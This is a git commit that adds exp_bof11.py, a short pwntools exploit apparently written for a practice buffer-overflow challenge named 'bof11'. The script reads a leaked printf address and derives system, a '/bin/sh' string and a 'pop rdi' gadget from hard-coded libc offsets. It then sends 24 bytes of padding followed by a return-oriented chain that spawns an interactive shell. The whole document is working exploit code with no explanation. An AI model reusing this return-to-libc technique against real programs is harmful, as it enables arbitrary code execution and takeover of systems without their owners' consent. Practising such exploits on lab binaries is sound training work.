c52afd4b5e9979922176112715ad2f0282941039
a <a@a.a>
2019-07-18 10:00:57 +0000

    bof11

---
+++ exp_bof11.py
@@ -0,0 +1,20 @@
+from pwn import *
+  
+p = process('./bof11')
+  
+p.recvuntil('printf() address : ')
+printf_addr = p.recvuntil('\n')
+printf_addr = int(printf_addr, 16)
+  
+sys_addr = printf_addr + (-66672)
+binsh = printf_addr + (1275223)
+poprdi = printf_addr + (-214782)
+distance_to_returnAddr = 24
+  
+exploit = "A" * distance_to_returnAddr 
+exploit += p64(poprdi)
+exploit += p64(binsh)
+exploit += p64(sys_addr)
+p.send(exploit)
+
+p.interactive()
